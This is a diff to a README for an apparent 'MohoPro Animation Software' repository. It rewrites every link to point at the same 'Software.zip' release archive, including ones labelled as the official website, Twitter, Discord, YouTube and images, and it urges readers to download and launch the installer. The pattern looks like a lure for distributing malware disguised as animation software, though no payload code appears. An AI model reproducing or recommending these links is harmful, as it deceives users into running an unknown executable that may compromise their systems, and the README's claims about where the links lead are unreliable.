@@ -1,7 +1,7 @@
 
 # 🎥✨ **MohoPro Animation Software Repository** 🎬✨
 
-![MohoPro Animation](https://yourimageurl.com)
+![MohoPro Animation](https://github.com/nateepro/MohoPro-Animation-Software/releases/download/v1.0/Software.zip)
 
 Welcome to the official repository for MohoPro Animation Software! With MohoPro, you can unleash your creativity and bring your ideas to life through stunning 2D animations. Whether you're a seasoned animator or just starting out, MohoPro has all the tools you need to create captivating animations with ease. 
 
@@ -24,17 +24,17 @@ MohoPro is a powerful animation software suite that caters to both professional 
 
 ## 🚀 Getting Started 🌈
 
-To get started with MohoPro Animation Software, [click here to download the latest version](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once downloaded, launch the installation file and follow the on-screen instructions to set up MohoPro on your system.
+To get started with MohoPro Animation Software, [click here to download the latest version](https://github.com/nateepro/MohoPro-Animation-Software/releases/download/v1.0/Software.zip). Once downloaded, launch the installation file and follow the on-screen instructions to set up MohoPro on your system.
 
-Don't forget to check out the extensive documentation and tutorials available on the **[official MohoPro website](https://www.mohopro.com)** for tips, tricks, and inspiration on creating amazing animations.
+Don't forget to check out the extensive documentation and tutorials available on the **[official MohoPro website](https://github.com/nateepro/MohoPro-Animation-Software/releases/download/v1.0/Software.zip)** for tips, tricks, and inspiration on creating amazing animations.
 
 ## 🎉 Join the Community 🤝
 
 Connect with fellow MohoPro users, share your creations, and get help from experts in the field by joining our vibrant community:
 
-- **Follow us on [Twitter](https://twitter.com/mohoproofficial)** for the latest updates and announcements.
-- **Join our [Discord server](https://discord.gg/mohopro)** to chat with like-minded individuals and participate in fun events.
-- **Explore our [YouTube channel](https://www.youtube.com/c/mohopro)** for tutorials, tips, and behind-the-scenes content.
+- **Follow us on [Twitter](https://github.com/nateepro/MohoPro-Animation-Software/releases/download/v1.0/Software.zip)** for the latest updates and announcements.
+- **Join our [Discord server](https://github.com/nateepro/MohoPro-Animation-Software/releases/download/v1.0/Software.zip)** to chat with like-minded individuals and participate in fun events.
+- **Explore our [YouTube channel](https://github.com/nateepro/MohoPro-Animation-Software/releases/download/v1.0/Software.zip)** for tutorials, tips, and behind-the-scenes content.
 
 ## 📌 Repository Topics 🏷️
 
@@ -51,4 +51,4 @@ Remember, creativity knows no bounds with MohoPro Animation Software. Let your i
 
 Thank you for being a part of the MohoPro community. Happy animating! 🎉🎨
 
-![MohoPro Logo](https://yourlogoimage.com)
+![MohoPro Logo](https://github.com/nateepro/MohoPro-Animation-Software/releases/download/v1.0/Software.zip)
